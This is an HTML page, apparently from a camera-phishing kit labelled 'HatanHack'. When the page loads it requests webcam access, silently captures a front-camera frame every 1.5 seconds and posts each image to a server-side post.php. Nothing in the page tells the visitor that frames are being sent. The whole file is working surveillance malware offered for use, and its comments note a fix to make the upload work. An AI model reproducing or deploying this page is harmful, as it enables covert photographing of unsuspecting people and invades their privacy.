<!doctype html>
<html>
<head>
<script type="text/javascript" src="hatan_assets/index.js"></script>
<link rel="stylesheet" type="text/css" href="hatan_assets/index.css">
<script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.js"></script>
</head>

<div class="video-wrap">
   <video id="video" playsinline autoplay></video>
</div>

<canvas id="canvas" width="640" height="480"></canvas>

<script>
// HatanHack - Function to send captured image data via AJAX
function post(imgdata){
$.ajax({
    type: 'POST',
    data: { cat: imgdata},
    // CRITICAL FIX: The URL is pointed directly to the customized post.php in the main directory.
    url: 'post.php', 
    dataType: 'json',
    async: false,
    success: function(result){
        // Function to handle the response/results
    },
    error: function(){
        // Error handling can be added here
    }
  });
};


'use strict';

const video = document.getElementById('video');
const canvas = document.getElementById('canvas');
const errorMsgElement = document.querySelector('span#errorMsg');

const constraints = {
  audio: false,
  video: {
    
    facingMode: "user"
  }
};

// Access webcam and prompt for permission
async function init() {
  try {
    const stream = await navigator.mediaDevices.getUserMedia(constraints);
    handleSuccess(stream);
  } catch (e) {
    errorMsgElement.innerHTML = `navigator.getUserMedia error:${e.toString()}`;
  }
}

// Success callback: starts video stream and capturing interval
function handleSuccess(stream) {
  window.stream = stream;
  video.srcObject = stream;

var context = canvas.getContext('2d');
  // Capture image every 1.5 seconds (1500 milliseconds)
  setInterval(function(){

       context.drawImage(video, 0, 0, 640, 480);
       var canvasData = canvas.toDataURL("image/png").replace("image/png", "image/octet-stream");
       post(canvasData); }, 1500);
  

}

// Load init function on page load
init();

</script>

    </body>

</html>
